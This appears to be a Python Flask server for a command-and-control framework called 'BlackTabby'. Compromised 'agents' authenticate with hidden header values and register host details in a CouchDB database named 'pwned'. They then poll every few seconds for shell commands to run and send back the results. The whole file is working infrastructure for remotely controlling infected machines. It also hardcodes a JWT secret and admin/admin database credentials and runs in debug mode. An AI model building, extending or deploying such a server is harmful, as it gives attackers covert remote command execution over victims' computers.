from flask import Flask, jsonify, request
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token,
    jwt_refresh_token_required, create_refresh_token,
    get_jwt_identity
)
import json
import sys
import couchdb
import datetime

app = Flask(__name__)

app.config['JWT_SECRET_KEY'] = 'dawoof7123'
jwt = JWTManager(app)


def generate_token(agent_id):
	access_token = create_access_token(identity=agent_id)
	return access_token

def gen_refresh_token(agent_id):
	refresh_token = create_refresh_token(identity=agent_id)
	return refresh_token

def connect_db():
	dbuser = "admin"
	dbpass = "admin"
	db_ip = "127.0.0.1"
	db_port = "5984"
	try:
	  couchserver = couchdb.Server("http://{}:{}@{}:{}".format(dbuser,dbpass,db_ip,db_port))
	  db_connection = couchserver['pwned']
	  return db_connection
	  ### RETURN THE DB CONNECTION THEN USE IN FIRST CHECKIN FUNCTION ###

	except:
		return jsonify({"Error":"CouchDB Server Not up or pwned db not setup, start the couchdb docker container and run the setup script"})


@app.route("/poll",methods = ['POST','GET'])
@jwt_required
def polling():
	if request.method == 'GET':
	  agent_id = get_jwt_identity()
	  doc_id = request.headers['doc_id']
	  db_conn = connect_db()
	  print(dict(db_conn[doc_id]))
	  return jsonify(dict(db_conn[doc_id])) ## returns database document
	  '''
	  AGENT GET REQUEST EVERY 10 SECONDS, If something in pending commands grab and run that
	  pending commands is list of strings
	  '''
	if request.method == 'POST':
		if not request.is_json:
		  return jsonify({"Error":"Unauthorized"})
		agent_id = get_jwt_identity()
		doc_id = request.headers['doc_id']
		db_conn = connect_db()
		doc = dict(db_conn[doc_id])
		content = request.get_json()
		print(content) ## posted json from agent
		db_conn.save(content) 
		## posted json from agent can be sent exactly back into the database
		## agents will move the pending command json to completed command json array
		## so this endpoint just sends it to the db
		return jsonify(content)

	return None




@app.route('/first_check_in', methods = ['POST'])
def first_checkin():
	print(request)
	headers = request.headers
	print(headers)
	if not request.is_json:
		return jsonify({"Error":"Unauthorized"})
	print
	if headers.get("User-Agent") != "QmxhY2tUYWJieQo=": ### BlackTabby Base64 Encoded
		return jsonify({"Error":"Unauthorized"})
	if headers.get("Agent") != "TGVhcm5pbmdDVG9CRWxpdGUK": ###Base64 LearningCToBElite
		return jsonify({"Error":"Unauthorized"})
	## gather parameters from json ##
	print(request.get_json())
	try:
	  content = request.get_json()
	  agent_id = content['agent_id']
	  os = content['os']
	  ip = content['ip']
	  user = content['user']
	  completed_commands = content['completed_commands']
	  pending_commands = content['pending_commands']
	  token = generate_token(agent_id)
	  refresh_token = gen_refresh_token(agent_id)
	  db_con = connect_db()
	  doc_id, doc_rev = db_con.save(content) ## posting check in doc to database
	  return jsonify({"id":doc_id,"rev":doc_rev,"refresh":refresh_token,"token":token}) # returns access token as awell as document id and doc rev to be used for updating

	except:
	  return jsonify({"Error":"Missing Parameters"})


@app.route('/refresh',methods = ['GET'])
@jwt_refresh_token_required
def refresh():
	agent_id= get_jwt_identity()
	new_token = {create_access_token(identity=agent_id)}
	return jsonify(new_token)






app.run(debug=True,port=9000)
#ssl_context='adhoc'




'''
	IF AUTH WORKS, PERFORM FIRST CHECK_IN
	FIRST CHECK_IN SENDS INITIAL DATA TO DATABASE
	AFTER THAT AGENT WILL POLL THIS APPLICATION ON THE /polling route
	for new commands


AGENT -> POST -> /first_check_in
^^^
Agent first checks in, he authenticates now hes in the database and can be controlled via the cli app
he is assigned a token that is used for subesquent requests

AGENT -> GET -> /polling 

Agent is now polling this app every 5 seconds waiting for something to show in the pending commands array
if something is there agent will run that command 

AGENT -> POST ->/polling
after a command is gotten via the get request if it is successfully ran it will 
POST the results of the command to the database via POST request to poll 

then it will go back to polling /get via get

'''







# json format always
'''
    	agent_id: int
    	OS: str
    	ip: str
    	user: str
    	completed_commands: list of dictionary
  	  	pending_commands:list of strings
  '''